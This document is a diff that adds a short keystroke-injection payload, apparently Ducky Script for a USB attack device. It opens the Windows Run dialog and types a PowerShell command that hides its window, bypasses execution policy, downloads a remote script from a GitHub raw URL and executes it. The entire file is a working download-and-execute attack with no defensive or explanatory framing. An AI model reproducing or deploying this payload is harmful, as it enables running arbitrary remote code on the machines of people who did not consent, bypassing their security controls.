@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/n0m4d1k/Scripts/main/Win-Scripts/windows-calling-card.ps1; invoke-expression $pl
+DELAY 500
+ENTER
